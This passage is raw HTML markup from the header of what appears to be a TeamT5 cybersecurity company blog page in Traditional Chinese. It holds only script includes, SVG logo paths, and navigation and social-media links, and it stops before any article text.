src="/_next/static/chunks/355-15d3d4def9e737543aae.js" defer=""></script><script src="/_next/static/chunks/40-c99810d551f4d9c6ca2d.js" defer=""></script><script src="/_next/static/chunks/625-71996cc7d9f6287d8f11.js" defer=""></script><script src="/_next/static/chunks/258-abfc1d233ee6f2e32b5d.js" defer=""></script><script src="/_next/static/chunks/502-5fb4c5ca4d423d22ef37.js" defer=""></script><script src="/_next/static/chunks/pages/%5Blang%5D/posts/%5Buid%5D-2ad5faee628e3c6ea341.js" defer=""></script><script src="/_next/static/yZH7uzr0jnSd-VRHt_pM1/_buildManifest.js" defer=""></script><script src="/_next/static/yZH7uzr0jnSd-VRHt_pM1/_ssgManifest.js" defer=""></script></head><body><div id="__next"><loading-mask></loading-mask><div style="background-color:#4c433f;height:100%;width:100%;z-index:100;position:absolute"></div><div class="invisible"><div class="css-5un68d"><div class="css-1tgzre3"><header class="css-d4eynq"><div class="css-9225oi"><a class="css-9obram" href="/tw/"><svg width="140px" height="140px" viewBox="0 0 140 140"><g id="Symbols" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="header_logo_L"><g><rect id="Rectangle" fill="#d93751" x="0" y="0" width="140" height="140"></rect><g id="logo" fill="#FEFEFE"><g class="css-17sqj2s"><path d="M45.3878535,7.83374722 L46.5394028,6.64521453 C41.9643042,2.79068668 36.0560225,0.348420339 29.5325296,0.000255690073 L29.5325296,7.2512 C30.6363042,8.26884649 33.1205859,8.98776174 36.5806423,8.98776174 C40.4539944,8.98776174 44.2998535,8.10477869 45.3878535,7.83374722" id="Fill-1"></path><path d="M26.3422648,52.6615012 L26.3422648,50.0376949 C19.5488,43.5926005 14.657307,42.8932881 12.8558423,42.8932881 L12.4429972,42.9060726 L9.33764507,46.0156901 C13.9118423,49.8697918 19.8196732,52.3129104 26.3422648,52.6615012" id="Fill-3"></path><path d="M46.3986028,45.2400969 C44.2419831,44.4845327 42.1705465,44.1001453 40.2415324,44.1001453 C33.6680113,44.1001453 30.3197296,48.5244358 29.4516732,49.8791671 L29.5192789,52.6619274 C36.3294197,52.3018305 42.4819831,49.6703535 47.1359549,45.5239128 L46.3986028,45.2400969 Z" id="Fill-5"></path><path d="M49.3275493,43.2795506 C53.0927324,39.0500107 55.4575775,33.7099235 55.8113803,27.8367225 L51.4832676,27.8367225 C49.2689577,28.6758121 47.6410141,30.0633569 46.8347042,31.9256329 C45.2644507,35.5670857 46.9270986,40.3173811 47.7140282,42.1903109 L49.3275493,43.2795506 Z" id="Fill-7"></path><path d="M16.046062,8.13963777 C20.6599211,8.13963777 24.7414986,7.04869346 26.3424,6.55904697 L26.3424,0.000170460048 C19.8198085,0.348761259 13.9128789,2.79145375 9.33868169,6.6451293 L10.3369915,7.58777337 C11.9067944,7.90823826 13.9128789,8.13963777 16.046062,8.13963777" id="Fill-9"></path><path d="M7.70582535,9.29574044 L7.08385352,8.77370654 C3.00002254,13.0923119 0.411628169,18.6684862 0.0429521127,24.8255031 L6.49072676,24.8255031 C11.2276282,18.4588203 7.85230423,9.67075254 7.70582535,9.29574044" id="Fill-11"></path><path d="M6.34780845,27.8365947 L0.0429070423,27.8365947 C0.412935211,33.9927593 2.99952676,39.5689337 7.08290704,43.887539 L9.97417839,41.1563429 C9.97778028,35.5507642 7.37811831,29.8667738 6.34780845,27.8365947" id="Fill-13"></path><path d="M12.8634141,24.8256736 C17.1762028,22.6514557 17.0261183,19.1634169 16.7484845,17.766923 L11.7177239,13.1244436 C12.1882592,16.1957075 12.254062,20.6979835 9.9315831,24.8256736 L12.8634141,24.8256736 Z" id="Fill-15"></path><path d="M13.7971831,10.8505065 L18.6422535,15.4235235 C19.5337465,15.5837559 20.6100282,15.7333346 21.5934648,15.7333346 C24.3594366,15.7333346 25.8409014,14.5482111 26.4732394,13.8416542 L26.3614648,9.47404165 C24.1588732,10.0962208 20.3977465,10.934032 16.0962254,10.934032 C15.3210141,10.934032 14.5494085,10.9050538 13.7971831,10.8505065" id="Fill-17"></path><path d="M41.6613859,24.8256736 L46.3753014,24.8256736 C44.5544563,23.29963 43.3163718,21.5485792 42.6876394,19.6040562 C42.1972732,18.0890925 42.1125408,16.4739835 42.4289352,14.7830199 L38.9531042,18.0673588 C38.9760901,18.1474751 38.910738,18.3170828 38.8954141,18.4986228 C38.7061183,20.6562208 40.6468507,23.5020513 41.6613859,24.8256736" id="Fill-19"></path><path d="M12.7555606,38.5327923 L17.2071662,34.3309521 C17.0530254,29.6173056 12.7055324,27.9787584 12.2038986,27.8057414 L9.59612394,27.8296058 C10.5912789,29.9816639 12.2462648,34.0816542 12.7555606,38.5327923" id="Fill-21"></path><path d="M46.2172845,27.8365947 L41.9004394,27.8365947 C38.0352,29.5646334 37.6029746,33.2550935 37.5912563,34.6933501 L43.6635944,39.135539 C43.1272563,36.6919942 42.9226366,33.6339409 44.1070873,30.8844203 C44.5970028,29.7410596 45.306862,28.7195777 46.2172845,27.8365947" id="Fill-23"></path><path d="M45.5075606,18.7829927 C46.6532507,22.3566877 50.5685183,24.3502179 51.7376451,24.8765133 L55.8349972,24.8317676 C55.4672225,18.673046 52.8801803,13.0943148 48.7949972,8.77485714 L48.1847437,9.35186441 L47.9224338,9.72900726 C45.4688,13.0917579 44.6588845,16.1374528 45.5075606,18.7829927" id="Fill-25"></path><path d="M29.5945014,42.8879613 L29.5286986,43.335845 L29.5327549,45.4930169 C31.5735437,43.6614237 35.1305014,41.4130557 40.2919662,41.4130557 C40.7354592,41.4130557 41.1830085,41.4296755 41.6341634,41.462063 L35.2923042,36.8251235 C30.4585014,37.3369298 29.6251493,42.6582663 29.5945014,42.8879613" id="Fill-27"></path><path d="M32.1713127,16.1228785 C32.5417915,16.2319729 32.9505803,16.2869462 33.3864113,16.2869462 C35.2847775,16.2869462 37.2480451,15.2326508 37.8037634,14.9100552 L41.4918761,11.4147719 C39.7634254,11.6551206 38.1237634,11.7769995 36.5963268,11.7769995 C33.7145239,11.7769995 31.3456225,11.3367864 29.5328901,10.4627525 L29.5328901,13.4862877 C30.1192563,14.8448542 31.0143549,15.7840891 32.1713127,16.1228785" id="Fill-29"></path><path d="M26.3422648,41.5732881 C24.648969,37.2640581 20.8373634,36.7778208 19.2747718,36.7778208 L18.9241239,36.7884746 L15.3054197,40.3536465 C17.9402366,40.863322 21.7130817,42.350586 26.3422648,46.2306828 L26.3422648,41.5732881 Z" id="Fill-31"></path><polygon id="Fill-33" points="27.9386592 34.3720329 36.4574197 26.3310063 27.9386592 18.2899797 19.4198986 26.3310063"></polygon></g><g class="css-13e8tc8"><path d="M53.5407775,0.00379273608 L45.8256225,0.00379273608 C45.6034254,0.00379273608 45.4114254,0.0800736077 45.2505239,0.232209201 C45.0896225,0.384770944 45.0089465,0.570998547 45.0089465,0.79174431 C45.0089465,1.01206392 45.0896225,1.19871768 45.2505239,1.35085327 C45.4114254,1.50341501 45.6034254,1.57926973 45.8256225,1.57926973 L48.5582423,1.57926973 C48.647031,1.57926973 48.6916507,1.61634479 48.6916507,1.68964262 L48.6916507,9.87513414 C48.6916507,10.127415 48.7858479,10.3456039 48.9751437,10.5288484 C49.163538,10.7129453 49.3970028,10.8049937 49.6746366,10.8049937 L49.6913127,10.8049937 C49.9581296,10.8049937 50.1884394,10.7129453 50.3831437,10.5288484 C50.5769465,10.3456039 50.6742986,10.127415 50.6742986,9.87513414 L50.6742986,1.68964262 C50.6742986,1.61634479 50.7135099,1.57926973 50.791031,1.57926973 L53.5407775,1.57926973 C53.7737915,1.57926973 53.9707493,1.50341501 54.1321014,1.35085327 C54.2930028,1.19871768 54.3736789,1.01206392 54.3736789,0.79174431 C54.3736789,0.570998547 54.2930028,0.384770944 54.1321014,0.232209201 C53.9707493,0.0800736077 53.7737915,0.00379273608 53.5407775,0.00379273608" id="Fill-35"></path><path d="M62.5289014,4.67316223 C61.895662,4.16732203 61.0830423,3.84856174 60.1978592,3.84472639 C60.192,3.84472639 56.8455211,3.84387409 56.8455211,3.84387409 L56.8455211,1.5908184 L61.8821408,1.5908184 C62.3468169,1.5908184 62.7209014,1.2345569 62.7209014,0.795196126 C62.7209014,0.356261501 62.3445634,9.9475983e-14 61.880338,9.9475983e-14 C61.8695211,9.9475983e-14 55.1661972,0.000426150121 55.1661972,0.000426150121 L55.1612394,5.45642615 C55.1612394,5.45642615 60.2442817,5.45813075 60.2587042,5.45898305 C61.2232113,5.50628571 61.9997746,6.45745278 61.9997746,7.30719613 C61.9997746,8.13435351 61.2633239,9.14646005 60.3335211,9.22018402 C60.3033239,9.22487167 55.2189296,9.21890557 55.2009014,9.22061017 C54.7610141,9.24617918 54.3743099,9.59349153 54.3743099,10.0158063 C54.3743099,10.0294431 54.3734085,10.0362615 54.3743099,10.0498983 C54.4009014,10.4700823 54.8250141,10.8105763 55.2748169,10.8105763 C55.3248451,10.8105763 60.1807324,10.8050363 60.1807324,10.8050363 C61.0397746,10.8050363 61.8294085,10.5399709 62.456338,10.1023148 C63.308169,9.50783535 63.8580282,8.32569492 63.8580282,7.30719613 C63.8580282,6.31682324 63.340169,5.32133656 62.5289014,4.67316223" id="Fill-37"></path><path d="M19.8986366,1.07875642 C20.091538,1.07875642 20.2492845,0.929177724 20.2492845,0.747211622 C20.2492845,0.56481937 20.091538,0.415666828 19.8986366,0.415666828 L12.4863549,0.415666828 L12.4859042,0.415666828 C12.2930028,0.415666828 12.135707,0.56481937 12.135707,0.747211622 L12.135707,10.4732358 C12.135707,10.5188339 12.1451718,10.5623012 12.1632,10.6023593 C12.2168338,10.7208291 12.3412282,10.8047806 12.4859042,10.8047806 L19.8986366,10.8047806 C20.091538,10.8047806 20.2492845,10.6556281 20.2492845,10.4732358 C20.2492845,10.2908436 20.091538,10.1421172 19.8986366,10.1421172 L12.8365521,10.1421172 L12.8365521,5.53884358 L19.4682141,5.53884358 C19.6444394,5.53884358 19.7882141,5.40247554 19.7882141,5.236277 L19.7882141,5.17874673 C19.7882141,5.01212203 19.6444394,4.875754 19.4682141,4.875754 L12.8365521,4.875754 L12.8365521,1.07875642 L19.8986366,1.07875642 Z" id="Fill-39"></path><path d="M10.1354366,0.415794673 L0.350647887,0.415794673 C0.157746479,0.415794673 -1.04805054e-13,0.564947215 -1.04805054e-13,0.746913317 C-1.04805054e-13,0.929305569 0.157746479,1.07888426 0.350647887,1.07888426 L4.89239437,1.07888426 L4.89239437,10.4733637 C4.89239437,10.6553298 5.05014085,10.8049085 5.24304225,10.8049085 C5.43594366,10.8049085 5.59369014,10.6553298 5.59369014,10.4733637 L5.59369014,1.07888426 L10.1354366,1.07888426 C10.328338,1.07888426 10.4860845,0.929305569 10.4860845,0.746913317 C10.4860845,0.564947215 10.328338,0.415794673 10.1354366,0.415794673" id="Fill-41"></path><path d="M24.5099718,6.72980533 L27.1776901,1.32025569 L29.8454085,6.72980533 L24.5099718,6.72980533 Z M27.5341972,0.47477385 C27.4692958,0.343093462 27.3232676,0.274909443 27.1776901,0.289824697 C27.0325634,0.274909443 26.8860845,0.343093462 26.8211831,0.47477385 L21.9643944,10.322677 C21.8828169,10.4875971 21.9589859,10.6861831 22.1338592,10.7633162 C22.3087324,10.8404494 22.5183099,10.76843 22.5998873,10.6030838 L24.1827606,7.39289492 L30.172169,7.39289492 L31.755493,10.6030838 C31.8370704,10.76843 32.0466479,10.8404494 32.2215211,10.7633162 C32.3963944,10.6861831 32.4725634,10.4875971 32.3909859,10.322677 L27.5341972,0.47477385 Z" id="Fill-43"></path><path d="M42.8502085,0.161510896 L42.8466028,0.161510896 C42.7375324,0.161510896 42.6433352,0.21264891 42.5793352,0.288077482 C42.5599549,0.306828087 42.5383211,0.323447942 42.5234479,0.347738499 L38.6347718,6.71612591 L34.7726873,0.391205811 C34.7298704,0.254837772 34.6014197,0.152561743 34.4436732,0.152561743 L34.4400676,0.152561743 C34.2480676,0.152561743 34.0912225,0.300861985 34.0912225,0.482401937 L34.0912225,10.466247 C34.0912225,10.6473608 34.2480676,10.795661 34.4400676,10.795661 L34.4436732,10.795661 C34.6352225,10.795661 34.7925183,10.6473608 34.7925183,10.466247 L34.7925183,1.74934625 L38.3300958,7.54243099 C38.3350535,7.55138015 38.3440676,7.55649395 38.3503775,7.56416465 C38.3589408,7.576523 38.3706592,7.58632446 38.3810254,7.59740436 C38.4017577,7.61828571 38.4224901,7.63788862 38.4472789,7.65280387 C38.4526873,7.65578692 38.4553915,7.66132688 38.4608,7.66388378 C38.4720676,7.66984988 38.4842366,7.67027603 38.4959549,7.67538983 C38.520293,7.68476513 38.5437296,7.69414044 38.5698704,7.69882809 C38.5919549,7.70223729 38.6126873,7.70266344 38.6347718,7.70266344 C38.6568563,7.70266344 38.6780394,7.70223729 38.6996732,7.69882809 C38.7258141,7.69414044 38.7492507,7.68476513 38.7735887,7.67538983 C38.7848563,7.67027603 38.7974761,7.66984988 38.8087437,7.66388378 C38.8141521,7.66132688 38.817307,7.65578692 38.8222648,7.65280387 C38.8475042,7.63788862 38.8677859,7.61828571 38.8885183,7.59740436 C38.8988845,7.58632446 38.9106028,7.576523 38.9191662,7.56416465 C38.9254761,7.55649395 38.9344901,7.55138015 38.9394479,7.54243099 L42.4977577,1.71525424 L42.4977577,10.4751961 C42.4977577,10.6563099 42.6546028,10.8050363 42.8466028,10.8050363 L42.8502085,10.8050363 C43.0422085,10.8050363 43.1990535,10.6563099 43.1990535,10.4751961 L43.1990535,0.49135109 C43.1990535,0.310237288 43.0422085,0.161510896 42.8502085,0.161510896" id="Fill-45"></path></g></g></g></g></g></svg></a><nav class="css-l5nqew"><div class="css-1d9x1rz"><div class="css-1xglul2 light"><div class="css-kknodv"><svg height="24" width="24" viewBox="0 0 24 24"><rect x="2" y="6" width="20" height="2" rx="1"></rect><rect x="2" y="11" width="20" height="2" rx="1"></rect><rect x="2" y="16" width="20" height="2" rx="1"></rect></svg></div></div></div><div class="css-jvtqvi disable-pointer-events"><div class="css-1umzfw"><div class="css-oro646"><div class="
              css-1wdsbza
              
            "></div><div class="
                css-1e542ht
                
              "><div class="css-x716e4"><div class="collapse css-23jkpm"><style data-emotion="css pi1u99">.css-pi1u99{-webkit-text-decoration:none;text-decoration:none;}.css-pi1u99.light{color:#fff;}.css-pi1u99.dark{color:#4c433f;}</style><a class="light css-pi1u99"><span>解決方案</span></a><div class="drop-icon dropdown-action-icon light show"><svg width="12px" height="7px" viewBox="0 0 12 7"><g id="Symbols" stroke="none" stroke-width="1"><g id="icon/down" transform="translate(-2.000000, -6.000000)"><g id="color/sonar_red" transform="translate(2.000000, 6.000000)"><path d="M0.295367042,0.295011084 C0.689189766,-0.0983370279 1.32770256,-0.0983370279 1.72152528,0.295011084 L6,4.56832964 L10.2784747,0.295011084 C10.6722974,-0.0983370279 11.3108102,-0.0983370279 11.704633,0.295011084 C12.0984557,0.688359195 12.0984557,1.32610249 11.704633,1.7194506 L6.71307912,6.70498892 C6.3192564,7.09833703 5.6807436,7.09833703 5.28692088,6.70498892 L0.295367042,1.7194506 C-0.0984556808,1.32610249 -0.0984556808,0.688359195 0.295367042,0.295011084 Z" id="Mask"></path></g></g></g></svg></div><div class="close-icon dropdown-action-icon"><img src="/images/icons/close.svg" alt="close icon"/></div></div><div class="css-1uptx9b"><div class="css-h7wgr8"><style data-emotion="css pi1u99">.css-pi1u99{-webkit-text-decoration:none;text-decoration:none;}.css-pi1u99.light{color:#fff;}.css-pi1u99.dark{color:#4c433f;}</style><a class="light css-pi1u99" href="/tw/products/threatsonar"><div class="css-frvq03"><div class="dropdown-item-image product css-1xyp7ut"><img src="/images/icons/ThreatSonar.svg" alt="threat-sonar"/></div><div class="css-brgklg">ThreatSonar</div><div class="css-redxgc"><div style="display:flex;justify-content:center;align-items:center;transform:rotate(180deg)"><svg width="40px" height="40px" viewBox="0 0 40 40"><g fill="#4c433f" transform="translate(5.000000, 5.000000)"><path d="M30,15 C30,15.4807835 29.627203,15.8770378 29.1469257,15.9311926 L29.0343052,15.9374971 L3.20017573,15.9367054 L15.3022515,28.4199682 C15.6677828,28.797006 15.6492627,29.3903257 15.2608856,29.7451848 C14.9023837,30.0727471 14.3540519,30.0826245 13.9843141,29.7856554 L13.8958136,29.7050268 L0.262475843,15.6425293 C-0.058327965,15.311627 -0.0850616157,14.8108998 0.182274891,14.4516934 L0.262475843,14.3574707 L13.8958136,0.294973235 C14.261345,-0.0820645885 14.8725086,-0.100043974 15.2608856,0.254815155 C15.6193876,0.582377427 15.6627451,1.11312505 15.3797938,1.48939075 L15.3022515,1.58003182 L3.20210712,14.0617057 L29.0343052,14.0624975 C29.5676437,14.0624975 30,14.4822331 30,15 Z"></path></g></svg></div></div></div></a><style data-emotion="css pi1u99">.css-pi1u99{-webkit-text-decoration:none;text-decoration:none;}.css-pi1u99.light{color:#fff;}.css-pi1u99.dark{color:#4c433f;}</style><a class="light css-pi1u99" href="/tw/products/threatvision"><div class="css-frvq03"><div class="dropdown-item-image product css-4cvnva"><img src="/images/icons/ThreatVision.svg" alt="threat-vision"/></div><div class="css-brgklg">ThreatVision</div><div class="css-redxgc"><div style="display:flex;justify-content:center;align-items:center;transform:rotate(180deg)"><svg width="40px" height="40px" viewBox="0 0 40 40"><g fill="#4c433f" transform="translate(5.000000, 5.000000)"><path d="M30,15 C30,15.4807835 29.627203,15.8770378 29.1469257,15.9311926 L29.0343052,15.9374971 L3.20017573,15.9367054 L15.3022515,28.4199682 C15.6677828,28.797006 15.6492627,29.3903257 15.2608856,29.7451848 C14.9023837,30.0727471 14.3540519,30.0826245 13.9843141,29.7856554 L13.8958136,29.7050268 L0.262475843,15.6425293 C-0.058327965,15.311627 -0.0850616157,14.8108998 0.182274891,14.4516934 L0.262475843,14.3574707 L13.8958136,0.294973235 C14.261345,-0.0820645885 14.8725086,-0.100043974 15.2608856,0.254815155 C15.6193876,0.582377427 15.6627451,1.11312505 15.3797938,1.48939075 L15.3022515,1.58003182 L3.20210712,14.0617057 L29.0343052,14.0624975 C29.5676437,14.0624975 30,14.4822331 30,15 Z"></path></g></svg></div></div></div></a></div></div></div><div class="css-x716e4"><div class="collapse css-23jkpm"><style data-emotion="css pi1u99">.css-pi1u99{-webkit-text-decoration:none;text-decoration:none;}.css-pi1u99.light{color:#fff;}.css-pi1u99.dark{color:#4c433f;}</style><a class="light css-pi1u99"><span>關於 TeamT5</span></a><div class="drop-icon dropdown-action-icon light show"><svg width="12px" height="7px" viewBox="0 0 12 7"><g id="Symbols" stroke="none" stroke-width="1"><g id="icon/down" transform="translate(-2.000000, -6.000000)"><g id="color/sonar_red" transform="translate(2.000000, 6.000000)"><path d="M0.295367042,0.295011084 C0.689189766,-0.0983370279 1.32770256,-0.0983370279 1.72152528,0.295011084 L6,4.56832964 L10.2784747,0.295011084 C10.6722974,-0.0983370279 11.3108102,-0.0983370279 11.704633,0.295011084 C12.0984557,0.688359195 12.0984557,1.32610249 11.704633,1.7194506 L6.71307912,6.70498892 C6.3192564,7.09833703 5.6807436,7.09833703 5.28692088,6.70498892 L0.295367042,1.7194506 C-0.0984556808,1.32610249 -0.0984556808,0.688359195 0.295367042,0.295011084 Z" id="Mask"></path></g></g></g></svg></div><div class="close-icon dropdown-action-icon"><img src="/images/icons/close.svg" alt="close icon"/></div></div><div class="css-1uptx9b"><div class="css-h7wgr8"><style data-emotion="css pi1u99">.css-pi1u99{-webkit-text-decoration:none;text-decoration:none;}.css-pi1u99.light{color:#fff;}.css-pi1u99.dark{color:#4c433f;}</style><a class="light css-pi1u99" href="/tw/about-us"><div class="css-frvq03"><div class="dropdown-item-image css-150aek"><img src="https://res.cloudinary.com/dvgomg5gh/image/upload/q_90/w_200,c_scale/f_auto/v1597723059/about_cover_59b796ac5a.jpg" alt="about-us"/></div><div class="css-brgklg">TeamT5 團隊</div><div class="css-redxgc"><div style="display:flex;justify-content:center;align-items:center;transform:rotate(180deg)"><svg width="40px" height="40px" viewBox="0 0 40 40"><g fill="#4c433f" transform="translate(5.000000, 5.000000)"><path d="M30,15 C30,15.4807835 29.627203,15.8770378 29.1469257,15.9311926 L29.0343052,15.9374971 L3.20017573,15.9367054 L15.3022515,28.4199682 C15.6677828,28.797006 15.6492627,29.3903257 15.2608856,29.7451848 C14.9023837,30.0727471 14.3540519,30.0826245 13.9843141,29.7856554 L13.8958136,29.7050268 L0.262475843,15.6425293 C-0.058327965,15.311627 -0.0850616157,14.8108998 0.182274891,14.4516934 L0.262475843,14.3574707 L13.8958136,0.294973235 C14.261345,-0.0820645885 14.8725086,-0.100043974 15.2608856,0.254815155 C15.6193876,0.582377427 15.6627451,1.11312505 15.3797938,1.48939075 L15.3022515,1.58003182 L3.20210712,14.0617057 L29.0343052,14.0624975 C29.5676437,14.0624975 30,14.4822331 30,15 Z"></path></g></svg></div></div></div></a><style data-emotion="css pi1u99">.css-pi1u99{-webkit-text-decoration:none;text-decoration:none;}.css-pi1u99.light{color:#fff;}.css-pi1u99.dark{color:#4c433f;}</style><a class="light css-pi1u99" href="/tw/careers"><div class="css-frvq03"><div class="dropdown-item-image css-150aek"><img src="https://res.cloudinary.com/dvgomg5gh/image/upload/q_90/w_200,c_scale/f_auto/v1597723058/TeamT5_Careers_img_b6492dddfd.jpg" alt="careers"/></div><div class="css-brgklg">人才招募</div><div class="css-redxgc"><div style="display:flex;justify-content:center;align-items:center;transform:rotate(180deg)"><svg width="40px" height="40px" viewBox="0 0 40 40"><g fill="#4c433f" transform="translate(5.000000, 5.000000)"><path d="M30,15 C30,15.4807835 29.627203,15.8770378 29.1469257,15.9311926 L29.0343052,15.9374971 L3.20017573,15.9367054 L15.3022515,28.4199682 C15.6677828,28.797006 15.6492627,29.3903257 15.2608856,29.7451848 C14.9023837,30.0727471 14.3540519,30.0826245 13.9843141,29.7856554 L13.8958136,29.7050268 L0.262475843,15.6425293 C-0.058327965,15.311627 -0.0850616157,14.8108998 0.182274891,14.4516934 L0.262475843,14.3574707 L13.8958136,0.294973235 C14.261345,-0.0820645885 14.8725086,-0.100043974 15.2608856,0.254815155 C15.6193876,0.582377427 15.6627451,1.11312505 15.3797938,1.48939075 L15.3022515,1.58003182 L3.20210712,14.0617057 L29.0343052,14.0624975 C29.5676437,14.0624975 30,14.4822331 30,15 Z"></path></g></svg></div></div></div></a></div></div></div><div class="css-gf2gsr"><style data-emotion="css pi1u99">.css-pi1u99{-webkit-text-decoration:none;text-decoration:none;}.css-pi1u99.light{color:#fff;}.css-pi1u99.dark{color:#4c433f;}</style><a class="css-17d51iu collapse light css-pi1u99" href="/tw/news-and-events">最新消息</a></div><div class="css-gf2gsr"><style data-emotion="css pi1u99">.css-pi1u99{-webkit-text-decoration:none;text-decoration:none;}.css-pi1u99.light{color:#fff;}.css-pi1u99.dark{color:#4c433f;}</style><a class="css-17d51iu collapse light css-pi1u99" href="/tw/blog">部落格</a></div><div class="css-x716e4"><div class="collapse css-23jkpm"><style data-emotion="css pi1u99">.css-pi1u99{-webkit-text-decoration:none;text-decoration:none;}.css-pi1u99.light{color:#fff;}.css-pi1u99.dark{color:#4c433f;}</style><a class="light css-pi1u99"><span>聯絡我們</span></a><div class="drop-icon dropdown-action-icon light show"><svg width="12px" height="7px" viewBox="0 0 12 7"><g id="Symbols" stroke="none" stroke-width="1"><g id="icon/down" transform="translate(-2.000000, -6.000000)"><g id="color/sonar_red" transform="translate(2.000000, 6.000000)"><path d="M0.295367042,0.295011084 C0.689189766,-0.0983370279 1.32770256,-0.0983370279 1.72152528,0.295011084 L6,4.56832964 L10.2784747,0.295011084 C10.6722974,-0.0983370279 11.3108102,-0.0983370279 11.704633,0.295011084 C12.0984557,0.688359195 12.0984557,1.32610249 11.704633,1.7194506 L6.71307912,6.70498892 C6.3192564,7.09833703 5.6807436,7.09833703 5.28692088,6.70498892 L0.295367042,1.7194506 C-0.0984556808,1.32610249 -0.0984556808,0.688359195 0.295367042,0.295011084 Z" id="Mask"></path></g></g></g></svg></div><div class="close-icon dropdown-action-icon"><img src="/images/icons/close.svg" alt="close icon"/></div></div><div class="css-1uptx9b"><div class="css-h7wgr8"><style data-emotion="css pi1u99">.css-pi1u99{-webkit-text-decoration:none;text-decoration:none;}.css-pi1u99.light{color:#fff;}.css-pi1u99.dark{color:#4c433f;}</style><a class="light css-pi1u99" href="/tw/request-information"><div class="css-frvq03"><div class="dropdown-item-image css-150aek"><img src="https://res.cloudinary.com/dvgomg5gh/image/upload/q_90/w_200,c_scale/f_auto/v1597723058/info_9e3a7cbe05.jpg" alt="request-information"/></div><div class="css-brgklg">索取資訊</div><div class="css-redxgc"><div style="display:flex;justify-content:center;align-items:center;transform:rotate(180deg)"><svg width="40px" height="40px" viewBox="0 0 40 40"><g fill="#4c433f" transform="translate(5.000000, 5.000000)"><path d="M30,15 C30,15.4807835 29.627203,15.8770378 29.1469257,15.9311926 L29.0343052,15.9374971 L3.20017573,15.9367054 L15.3022515,28.4199682 C15.6677828,28.797006 15.6492627,29.3903257 15.2608856,29.7451848 C14.9023837,30.0727471 14.3540519,30.0826245 13.9843141,29.7856554 L13.8958136,29.7050268 L0.262475843,15.6425293 C-0.058327965,15.311627 -0.0850616157,14.8108998 0.182274891,14.4516934 L0.262475843,14.3574707 L13.8958136,0.294973235 C14.261345,-0.0820645885 14.8725086,-0.100043974 15.2608856,0.254815155 C15.6193876,0.582377427 15.6627451,1.11312505 15.3797938,1.48939075 L15.3022515,1.58003182 L3.20210712,14.0617057 L29.0343052,14.0624975 C29.5676437,14.0624975 30,14.4822331 30,15 Z"></path></g></svg></div></div></div></a><style data-emotion="css pi1u99">.css-pi1u99{-webkit-text-decoration:none;text-decoration:none;}.css-pi1u99.light{color:#fff;}.css-pi1u99.dark{color:#4c433f;}</style><a class="light css-pi1u99" href="/tw/become-a-partner"><div class="css-frvq03"><div class="dropdown-item-image css-150aek"><img src="https://res.cloudinary.com/dvgomg5gh/image/upload/q_90/w_200,c_scale/f_auto/v1602841516/partner_c95a01f8af.jpg" alt="partner"/></div><div class="css-brgklg">成為合作夥伴</div><div class="css-redxgc"><div style="display:flex;justify-content:center;align-items:center;transform:rotate(180deg)"><svg width="40px" height="40px" viewBox="0 0 40 40"><g fill="#4c433f" transform="translate(5.000000, 5.000000)"><path d="M30,15 C30,15.4807835 29.627203,15.8770378 29.1469257,15.9311926 L29.0343052,15.9374971 L3.20017573,15.9367054 L15.3022515,28.4199682 C15.6677828,28.797006 15.6492627,29.3903257 15.2608856,29.7451848 C14.9023837,30.0727471 14.3540519,30.0826245 13.9843141,29.7856554 L13.8958136,29.7050268 L0.262475843,15.6425293 C-0.058327965,15.311627 -0.0850616157,14.8108998 0.182274891,14.4516934 L0.262475843,14.3574707 L13.8958136,0.294973235 C14.261345,-0.0820645885 14.8725086,-0.100043974 15.2608856,0.254815155 C15.6193876,0.582377427 15.6627451,1.11312505 15.3797938,1.48939075 L15.3022515,1.58003182 L3.20210712,14.0617057 L29.0343052,14.0624975 C29.5676437,14.0624975 30,14.4822331 30,15 Z"></path></g></svg></div></div></div></a></div></div></div><div class="css-1nae23b"><style data-emotion="css 11g9kr1">.css-11g9kr1{-webkit-text-decoration:none;text-decoration:none;}</style><a class="css-3n5iv4 css-11g9kr1" href="https://www.facebook.com/TeamT5.org/"><div class="css-6tkolk"><svg width="24px" height="24px" viewBox="0 0 24 24" version="1.1"><g id="Symbols" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><path class="light" d="M22,0 C23.1045695,-2.02906125e-16 24,0.8954305 24,2 L24,22 C24,23.0543618 23.1841222,23.9181651 22.1492623,23.9945143 L22,24 L22,24 L14,24 L14,23.978 L13.875,24 L13.875,15.5633307 L16.6710937,15.5633307 L17.203125,12.0733717 L13.875,12.0733717 L13.875,9.80860051 C13.875,8.85381375 14.3398828,7.92315016 15.8305781,7.92315016 L15.8305781,7.92315016 L17.34375,7.92315016 L17.34375,4.95196885 C17.34375,4.95196885 15.9704766,4.71616081 14.6575781,4.71616081 C11.9165156,4.71616081 10.125,6.3875682 10.125,9.41345698 L10.125,9.41345698 L10.125,12.0733717 L7.078125,12.0733717 L7.078125,15.5633307 L10.125,15.5633307 L10.125,24 C10.0832306,23.9934058 10.0415327,23.9865949 9.99990751,23.9795684 L10,24 L2,24 C0.8954305,24 1.3527075e-16,23.1045695 0,22 L0,2 C-1.3527075e-16,0.8954305 0.8954305,2.02906125e-16 2,0 L22,0 Z" id="path-1"></path></g></svg></div></a><style data-emotion="css 11g9kr1">.css-11g9kr1{-webkit-text-decoration:none;text-decoration:none;}</style><a class="css-3n5iv4 css-11g9kr1" href="https://www.linkedin.com/company/teamt5/"><div class="css-6tkolk"><svg width="24px" height="24px" viewBox="0 0 24 24"><g id="Symbols" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="sns/linkedin/nor"><path class="light" d="M21,0 C22.6568542,-3.04359188e-16 24,1.34314575 24,3 L24,21 C24,22.6568542 22.6568542,24 21,24 L3,24 C1.34314575,24 2.02906125e-16,22.6568542 0,21 L0,3 C-2.02906125e-16,1.34314575 1.34314575,3.04359188e-16 3,0 L21,0 Z M19.0257087,9.0309163 C16.1146435,7.90189457 14.1125239,9.13845978 13.5311978,10.2828185 L13.5311978,10.2828185 L13.4415783,10.4056989 L13.3876217,10.4056989 L13.3876217,8.83634022 L10.0184804,8.83634022 L10.0184804,20.1829163 L13.5311978,20.1829163 L13.5316179,14.0152782 C13.5352018,13.9482549 13.5643166,13.4915116 13.7156109,12.9431337 C13.879513,12.3490576 14.4018935,11.8678837 15.0368065,11.7243076 C15.6717196,11.5811011 16.2554478,11.7243076 16.5934152,11.8678837 C16.9313826,12.0110902 17.1054478,12.3643946 17.1745565,12.471938 C17.2436652,12.5794815 17.458937,13.2476554 17.458937,13.6240576 L17.458937,13.6240576 L17.458937,20.1829163 